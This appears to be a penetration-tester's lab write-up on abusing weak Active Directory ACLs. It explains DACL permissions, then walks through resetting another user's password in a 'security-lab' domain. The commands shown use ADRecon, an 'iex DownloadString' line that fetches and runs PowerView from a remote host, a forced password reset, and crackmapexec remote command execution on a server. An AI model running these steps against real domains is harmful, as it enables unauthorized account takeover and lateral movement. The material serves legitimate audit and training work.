============================================================================================================
Abusing weak permissions (ACLs)
============================================================================================================

Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e. change account name, reset password, etc). 

Some of the Active Directory object permissions and types that are interesting to review and exploit during penetration tests and security audits:
> GenericAll               - full rights to the object (e.g. add users to a group or reset its password)
> GenericWrite             - update object's attributes (i.e logon script)
> WriteOwner               - change object owner to attacker controlled user take over the object
> WriteDACL                - modify object's ACEs and give attacker full control right over the object
> AllExtendedRights        - ability to add user to a group or reset password
> ForceChangePassword      - ability to change user's password
> Self (Self-Membership)   - ability to add yourself to a group


Notes regarding Windows ACLs
-----------------------------
Every authenticated user gets an access token. Each process or thread created by that user has a copy of that access token. 
The token contains identity (SIDs) and privileges of the user. 

Now, when a process tries to access a securable object (Files, Registry Keys, Services, Domain Objects etc.) it uses the access token. 
A securable object, by definition, has a security descriptor. 
A security descriptor can contain Access Control List (ACL) which is a list of Access Control Entries (ACE). 
There are two types of ACLs  Discretionary Access Control List (DACL) and SACL (System Access Control List). 

DACL controls access to an object and SACL controls logging of access attempts. 


============================================================================================================
Example of an attack exploiting weak ACLs - Arbitrary reset another account password
============================================================================================================

Step 1 - Extract and review the list of ACLs using for example the powershell script 'ADrecon.ps1'
------------------------------------------------------------------------------------------------------------

PS C:\Users\auditor\Documents\ADRecon-master> .\ADRecon.ps1 -Method ADWS -DomainController 192.168.1.50 -Credential security-lab\auditor -Collect ACLs

> file 'DACLs.csv' 

Name	          Type	    ObjectTypeName	            InheritedObjectTypeName	  ActiveDirectoryRights	  AccessControlType	  IdentityReferenceName	  OwnerName	        <SNIP>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																												
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<SNIP>
webadmin       User	    User-Force-Change-Password	All	                      ExtendedRight	          Allow	              Domain Users     	      Domain Admins	  	<SNIP>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																														
webadmin       User	    User-Change-Password         All	                      ExtendedRight	          Allow	              Domain Users     	      Domain Admins		  <SNIP>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																											
<SNIP>


=> All the accounts member of the 'Domain Users' can arbitary reset the password of the account 'Security-lab\webadmin'
   Our account 'security-lab\auditor' is member of the 'Domain Users'.


Step 2 - Abuse the weak ACL and reset the password of the account 'security-lab\webadmin'
-------------------------------------------------------------------------------------------------------------------

=> Using the PowerView framework we reset the password of the account 'security-lab\webadmin' (we choose the password 'Password123!')

PS C:\Users\auditor\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\auditor\Documents> iex (New-Object Net.WebClient).DownloadString('http://XX.X.X.XX/PowerView_dev.ps1')
PS C:\Users\auditor\Documents> Set-DomainUserPassword -Identity security-lab\webadmin -AccountPassword $UserPassword


=> Based on the login name 'webadmin', we can guess that the account is more likey admin of the Web servers. 
   So we try to log into the web server 'WEBSRV01' in our security-lab domain.

PS C:\Users\auditor\Documents> crackmapexec.exe -u webadmin -d security-lab -p Password123! -x "whoami" 192.168.1.51
07-18-2020 14:32:39 [*] 192.168.1.51:445 is running Windows 10.0 Build 14393 (name:WEBSRV01) (domain:security-lab)
07-18-2020 14:32:39 [+] 192.168.1.51:445 Login successful security-lab\webadmin:Password123!
07-18-2020 14:32:41 [+] 192.168.1.51:445 Executed command via WMIEXEC
07-18-2020 14:32:41 security-lab\webadmin

=> It worked, we are indeed local admin of the server 'WEBSRV01'...


